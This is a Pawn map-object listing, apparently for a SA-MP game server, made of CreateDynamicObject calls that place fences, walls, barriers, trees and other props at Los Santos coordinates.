	CreateDynamicObject(3578, 1286.70898, -1783.02405, 11.37120,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3578, 1282.33203, -1782.89465, 15.73000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3578, 1272.91943, -1782.38025, 15.73000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8432, 1257.99695, -1752.26526, 16.53880,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1272.91943, 1282.33203, 15.73000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3578, 1282.33203, -1782.38025, 15.73000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1450, 1265.59045, -1779.62085, 13.12650,   0.00000, 0.00000, -106.97997);
	CreateDynamicObject(1450, 1265.03674, -1777.27356, 13.12650,   0.00000, 0.00000, -53.16000);
	CreateDynamicObject(970, 1059.29724, -1774.96057, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1095.54199, -1777.06372, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1087.19165, -1777.06372, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1083.01660, -1777.06372, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1078.83875, -1777.06372, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1074.66650, -1777.06372, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1065.52576, -1777.06372, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1061.34705, -1777.06372, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1099.71594, -1777.06372, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1101.78223, -1770.78296, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1101.78223, -1766.60608, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1101.78223, -1762.42957, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1101.78223, -1758.25415, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1108.78125, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1101.78223, -1754.07874, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1112.95581, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1117.12915, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1121.30481, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1125.47974, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1129.65430, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1133.82874, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1138.00305, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1142.17725, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1146.31482, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1150.47913, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1154.63489, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1158.76965, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1162.90723, -1745.89148, 13.02640,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1158.76965, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1154.63489, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1150.47913, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1146.31482, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1142.17725, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1138.00305, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1129.65430, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1133.82874, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1125.47974, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1112.95581, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1117.12915, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1121.30481, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1104.61035, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1112.95581, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1108.78125, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1100.43567, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1096.26135, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1087.91125, -1735.84888, 13.18000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1083.73669, -1735.84888, 13.18000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1079.56140, -1735.84888, 13.18000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1069.71082, -1735.84888, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1065.53455, -1735.84888, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1061.36072, -1735.84888, 12.96910,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1101.78223, -1774.96057, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1059.29724, -1770.84497, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1059.29724, -1766.67212, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1059.29724, -1762.53760, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1059.29724, -1758.40430, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1059.29724, -1754.27014, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1059.29724, -1737.94165, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1059.29724, -1750.14294, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1059.29724, -1746.07910, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1059.29724, -1742.01062, 12.96910,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(713, 1159.67456, -1725.74219, 12.15630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1425, 1176.68140, -1810.68909, 12.98490,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1425, 1176.68140, -1783.58203, 12.98490,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1425, 1176.68140, -1796.33411, 12.98490,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.84753, -1783.91113, 12.97109,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.85132, -1786.60828, 12.97110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.85132, -1789.32788, 12.97110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.85132, -1792.06812, 12.97110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.85132, -1794.79565, 12.97110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.85132, -1797.53845, 12.97110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.85132, -1800.27832, 12.97110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.85132, -1803.01770, 12.97110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.85132, -1805.75903, 12.97110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.85132, -1808.47852, 12.97110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1165.85132, -1811.19641, 12.97110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1422, 1164.31787, -1813.08447, 12.97110,   0.00000, 0.00000, -157.43993);
	CreateDynamicObject(1422, 1162.41968, -1815.06311, 12.97110,   0.00000, 0.00000, -108.77993);
	CreateDynamicObject(1422, 1164.69995, -1781.48938, 12.97109,   0.00000, 0.00000, -34.91999);
	CreateDynamicObject(1422, 1162.74573, -1779.34216, 12.97109,   0.00000, 0.00000, -61.43999);
	CreateDynamicObject(19457, 1163.27246, -1787.39490, 12.53360,   0.00000, 90.00000, 180.00000);
	CreateDynamicObject(713, 1089.10510, -1725.74219, 12.15630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(713, 1122.36169, -1725.74219, 12.15630,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1162.00000, 6910.00000, -1730.00000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1158.71802, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1162.90723, -1735.84888, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1162.87830, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1154.54126, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1150.38074, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1146.21802, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1142.05554, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1137.89465, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1133.73804, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1129.57764, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1125.41748, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1087.97034, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1121.25586, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1117.11047, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1112.94275, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1108.76892, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1104.61060, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1100.46716, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1096.30176, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1092.13623, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1063.04712, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1083.81042, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1079.68042, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1075.52100, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1071.36694, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1067.20679, -1730.85608, 13.22700,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, 1054.29895, -1741.23486, 13.22700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1058.92834, -1731.22437, 13.22700,   0.00000, 0.00000, 10.73999);
	CreateDynamicObject(970, 1055.69617, -1733.31726, 13.22700,   0.00000, 0.00000, 54.95993);
	CreateDynamicObject(970, 1054.40820, -1737.09180, 13.22700,   0.00000, 0.00000, 87.11998);
	CreateDynamicObject(970, 1054.29895, -1745.40295, 13.22700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1054.29895, -1749.57324, 13.22700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1054.29895, -1753.74072, 13.22700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1054.29895, -1757.91125, 13.22700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1054.29895, -1762.08118, 13.22700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1054.29895, -1766.25305, 13.22700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1054.29895, -1774.59399, 13.22700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, 1054.29895, -1770.42407, 13.22700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19457, 1163.27246, -1806.54651, 12.53360,   0.00000, 90.00000, 180.00000);
	CreateDynamicObject(19457, 1163.27246, -1796.95398, 12.53360,   0.00000, 90.00000, 180.00000);
	CreateDynamicObject(19447, 1161.86902, -1806.11975, 18.23670,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1809.61646, 27.80790,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1809.61646, 8.60060,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1809.61646, 18.23670,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1802.63147, 18.23670,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1799.14246, 18.23670,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1795.64832, 18.23470,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1792.15515, 18.23470,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1788.67053, 18.23470,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1785.18481, 18.23470,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1781.70276, 18.23470,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1806.10242, 8.60060,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1802.63147, 8.60060,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1799.14246, 8.60060,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1795.64832, 8.60060,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1792.15515, 8.60060,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1788.67053, 8.60060,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1785.18481, 8.60060,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1781.70276, 8.60060,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1806.11975, 27.80790,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1802.63147, 27.80790,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1799.14246, 27.80790,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1795.64832, 27.80790,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1792.15515, 27.80790,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1788.67053, 27.80790,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1785.18481, 27.80790,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(19447, 1161.86902, -1781.70276, 27.80790,   -90.00000, 0.00000, 0.00000);
	CreateDynamicObject(647, 1090.60669, -1700.05640, 14.68750,   356.85840, 0.00000, -0.78540);
	CreateDynamicObject(6300, 379.53879, -1918.46655, -1.21580,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3361, 142.43320, -1884.52100, 1.27660,   0.00000, 0.00000, -180.00000);
	CreateDynamicObject(3406, 136.84430, -1884.52100, -1.92200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3406, 128.08321, -1884.52100, -1.92200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3406, 119.30220, -1884.52100, -1.92200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3406, 123.20820, -1878.63892, -1.92200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3406, 110.52040, -1884.52100, -1.92200,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3406, 131.97691, -1889.36914, -1.92200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3406, 131.97690, -1878.63892, -1.92200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3406, 123.20820, -1889.36914, -1.92200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3406, 114.42030, -1889.35669, -1.92200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3406, 106.58530, -1878.63892, -1.92200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3406, 114.43280, -1878.63892, -1.92200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3406, 106.58530, -1889.35669, -1.92200,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1232, 109.97880, -1885.53333, 0.32780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 127.53620, -1885.53333, 0.32780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 118.75250, -1885.53333, 0.32780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 127.53620, -1883.53015, 0.32780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 118.75250, -1883.53015, 0.32780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 109.97880, -1883.53015, 0.32780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 136.29601, -1883.53015, 0.32780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1232, 136.29601, -1885.53333, 0.32780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(983, 1407.75037, -1708.91736, 13.86029,   0.00000, 0.00000, -89.81995);
	CreateDynamicObject(983, 1401.37646, -1708.96191, 13.86029,   0.00000, 0.00000, -89.81995);
	CreateDynamicObject(983, 1394.98071, -1709.03870, 13.86029,   0.00000, 0.00000, -89.15997);
	CreateDynamicObject(983, 1390.20435, -1709.13708, 13.86029,   0.00000, 0.00000, -89.15997);
	CreateDynamicObject(983, 1383.89014, -1708.46594, 13.86029,   0.00000, 0.00000, -103.07999);
	CreateDynamicObject(983, 1380.78809, -1707.73779, 13.86029,   0.00000, 0.00000, -103.07999);
	CreateDynamicObject(983, 1375.88940, -1704.37036, 13.86029,   0.00000, 0.00000, -146.88010);
	CreateDynamicObject(983, 1374.61731, -1697.57129, 13.86029,   0.00000, 0.00000, -197.46017);
	CreateDynamicObject(983, 1376.51904, -1691.34033, 13.86029,   0.00000, 0.00000, -196.44022);
	CreateDynamicObject(983, 1378.22070, -1685.09680, 13.86029,   0.00000, 0.00000, -193.50034);
	CreateDynamicObject(983, 1375.03418, -1703.01563, 13.86029,   0.00000, 0.00000, -150.00002);
	CreateDynamicObject(983, 1410.58960, -1712.16125, 13.86029,   0.00000, 0.00000, -185.45999);
	CreateDynamicObject(983, 1409.98804, -1718.63391, 13.86029,   0.00000, 0.00000, -185.45999);
	CreateDynamicObject(983, 1406.45129, -1721.95825, 13.86029,   0.00000, 0.00000, -270.17944);
	CreateDynamicObject(983, 1400.11743, -1721.93103, 13.86029,   0.00000, 0.00000, -270.17944);
	CreateDynamicObject(983, 1393.75293, -1721.91431, 13.86029,   0.00000, 0.00000, -270.17944);
	CreateDynamicObject(983, 1387.34961, -1721.89539, 13.86029,   0.00000, 0.00000, -270.17944);
	CreateDynamicObject(983, 1380.96667, -1721.87610, 13.86029,   0.00000, 0.00000, -270.17944);
	CreateDynamicObject(983, 1374.55396, -1721.84778, 13.86029,   0.00000, 0.00000, -270.17944);
	CreateDynamicObject(983, 1368.11523, -1721.86841, 13.86029,   0.00000, 0.00000, -270.17944);
	CreateDynamicObject(983, 1361.76025, -1721.90466, 13.44795,   0.00000, 0.00000, 90.43576);
	CreateDynamicObject(983, 1355.34619, -1721.99683, 13.44795,   0.00000, 0.00000, 90.43576);
	CreateDynamicObject(983, 1352.18542, -1718.82861, 13.86029,   0.00000, 0.00000, -180.35939);
	CreateDynamicObject(983, 1352.20898, -1712.44324, 13.86029,   0.00000, 0.00000, -180.35939);
	CreateDynamicObject(983, 1352.25208, -1705.99878, 13.86029,   0.00000, 0.00000, -180.35939);
	CreateDynamicObject(983, 1352.28052, -1699.58569, 13.86029,   0.00000, 0.00000, -180.35939);
	CreateDynamicObject(983, 1352.30872, -1693.14294, 13.86029,   0.00000, 0.00000, -180.35939);
	CreateDynamicObject(983, 1352.29297, -1687.46643, 13.86029,   0.00000, 0.00000, -180.35939);
	CreateDynamicObject(983, 1368.57861, -1681.12476, 13.86029,   0.00000, 0.00000, -179.64027);
	CreateDynamicObject(983, 1358.90808, -1684.33264, 12.57453,   0.00000, 0.00000, -269.88062);
	CreateDynamicObject(983, 1355.61926, -1684.31763, 13.86029,   0.00000, 0.00000, -269.88062);
	CreateDynamicObject(983, 1358.90808, -1684.33264, 13.86029,   0.00000, 0.00000, -269.88062);
	CreateDynamicObject(983, 1365.29993, -1684.29211, 13.86029,   0.00000, 0.00000, -270.30060);
	CreateDynamicObject(983, 1363.69141, -1684.28137, 12.57453,   0.00000, 0.00000, -269.88062);
	CreateDynamicObject(983, 1368.41663, -1601.17700, 13.88970,   0.12000, 0.00000, -16.38000);
	CreateDynamicObject(983, 1355.18176, -1593.59949, 13.88970,   0.12000, 0.00000, 345.50644);
	CreateDynamicObject(983, 1353.57678, -1599.75830, 13.88970,   0.12000, 0.00000, 345.50644);
	CreateDynamicObject(983, 1353.14282, -1601.32166, 13.88970,   0.12000, 0.00000, 345.50644);
	CreateDynamicObject(983, 1352.31921, -1607.65784, 13.88970,   0.12000, 0.00000, 360.20639);
	CreateDynamicObject(983, 1352.34851, -1614.00977, 13.88970,   0.12000, 0.00000, 360.20639);
	CreateDynamicObject(983, 1352.25024, -1615.60693, 13.88970,   0.12000, 0.00000, 360.20639);
	CreateDynamicObject(983, 1359.64282, -1591.87256, 13.47627,   0.12000, 0.00000, 73.85999);
	CreateDynamicObject(983, 1366.13586, -1572.72241, 13.32631,   0.12000, 0.00000, 253.74467);
	CreateDynamicObject(983, 1370.74255, -1574.09790, 14.48300,   0.12000, 0.00000, 253.74467);
	CreateDynamicObject(983, 1370.74255, -1574.09790, 13.32631,   0.12000, 0.00000, 253.74467);
	CreateDynamicObject(983, 1366.11194, -1572.65503, 14.48300,   0.12000, 0.00000, 253.74467);
	CreateDynamicObject(620, 1375.02100, -1621.80408, 13.03950,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(620, 1384.62939, -1623.41357, 13.03950,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(803, 1374.94604, -1621.69128, 13.04122,   0.00000, 0.00000, -17.58000);
	CreateDynamicObject(803, 1377.73706, -1622.25476, 13.04122,   0.00000, 0.00000, 12.36000);
	CreateDynamicObject(803, 1380.54163, -1622.54346, 13.04122,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(803, 1382.65820, -1622.97290, 13.04122,   0.00000, 0.00000, 16.32000);
	CreateDynamicObject(640, 1416.87097, -1652.96765, 13.24150,   0.00000, 0.00000, 270.07458);
	CreateDynamicObject(640, 1411.52905, -1652.96802, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1406.15234, -1652.96765, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1400.77551, -1652.96802, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1395.39868, -1652.96765, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1390.02246, -1652.96802, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1416.87097, -1644.26257, 13.24150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19425, 1416.77063, -1650.67603, 12.37189,   0.00000, 0.00000, -89.27998);
	CreateDynamicObject(19425, 1416.68811, -1646.49487, 12.37189,   0.00000, 0.00000, -89.27998);
	CreateDynamicObject(19425, 1404.37463, -1650.83118, 12.37189,   0.00000, 0.00000, -89.27998);
	CreateDynamicObject(19425, 1404.30457, -1646.60339, 12.37189,   0.00000, 0.00000, -89.27998);
	CreateDynamicObject(19425, 1389.13940, -1650.79126, 12.37189,   0.00000, 0.00000, -89.27998);
	CreateDynamicObject(19425, 1388.93396, -1646.60876, 12.37189,   0.00000, 0.00000, -89.27998);
	CreateDynamicObject(16781, 1404.75916, -1615.38940, 12.53410,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3657, 1374.70239, -1625.25623, 12.95414,   0.00000, 0.00000, 352.28754);
	CreateDynamicObject(1337, 1400.80188, -1708.39502, 13.09999,   0.00000, 0.00000, -89.57995);
	CreateDynamicObject(1337, 1400.79126, -1707.79480, 13.09999,   0.00000, 0.00000, -89.57995);
	CreateDynamicObject(1332, 1400.48938, -1705.58899, 13.50856,   0.00000, 0.00000, 270.58325);
	CreateDynamicObject(853, 1362.04382, -1717.97009, 7.95819,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(854, 1359.65637, -1718.89783, 7.96045,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(849, 1360.23022, -1717.24011, 7.82274,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(849, 1357.28870, -1719.10596, 7.82274,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(854, 1358.48083, -1717.52307, 7.96045,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(854, 1361.79590, -1716.02856, 7.96045,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(854, 1359.88806, -1715.45361, 7.96045,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(854, 1356.00452, -1715.52002, 7.96045,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(849, 1357.74524, -1716.27100, 7.82274,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(852, 1355.76111, -1717.16980, 7.54026,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(852, 1355.68787, -1710.36914, 7.54026,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(852, 1360.91541, -1713.01697, 7.54026,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(852, 1362.42334, -1720.04236, 7.54026,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(852, 1360.51660, -1719.84119, 7.54026,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1358, 1355.53882, -1712.70093, 8.72457,   0.00000, 0.00000, 269.40909);
	CreateDynamicObject(3265, 1378.50293, -1679.33789, 11.59419,   0.00000, 0.00000, 174.40837);
	CreateDynamicObject(3265, 1370.18384, -1678.71619, 11.44678,   0.00000, 0.00000, 535.12970);
	CreateDynamicObject(9339, 1419.50220, -1709.52869, 12.81931,   0.00000, 0.00000, 0.12000);
	CreateDynamicObject(9339, 1419.47046, -1683.55566, 12.81931,   0.00000, 0.00000, 0.12000);
	CreateDynamicObject(9339, 1419.46228, -1666.24854, 12.81931,   0.00000, 0.00000, 0.12000);
	CreateDynamicObject(9339, 1419.40015, -1630.98669, 12.60180,   0.00000, 0.00000, 0.12000);
	CreateDynamicObject(9339, 1419.40479, -1615.50525, 12.60180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1406.50073, -1602.46899, 12.60180,   0.00000, 0.00000, 90.17990);
	CreateDynamicObject(9339, 1381.13501, -1598.28406, 12.60180,   0.00000, 0.00000, 71.09990);
	CreateDynamicObject(983, 1416.37805, -1722.51868, 13.24509,   0.00000, 0.00000, -270.95999);
	CreateDynamicObject(983, 1413.11511, -1722.38635, 13.24509,   0.00000, 0.00000, -270.95999);
	CreateDynamicObject(640, 1415.71130, -1673.09094, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1404.58252, -1707.65967, 13.21780,   0.00000, 0.00000, -89.67380);
	CreateDynamicObject(640, 1401.55115, -1673.09265, 13.21780,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(640, 1404.61584, -1670.74255, 13.21780,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(640, 1412.67407, -1707.65967, 13.21780,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19372, 1403.63550, -1705.72888, 12.57060,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(14469, 1404.40051, -1673.08142, 12.96729,   0.00000, 0.00000, 0.60000);
	CreateDynamicObject(713, 1409.10400, -1675.71643, 12.11590,   0.00000, 0.00000, 0.00000);
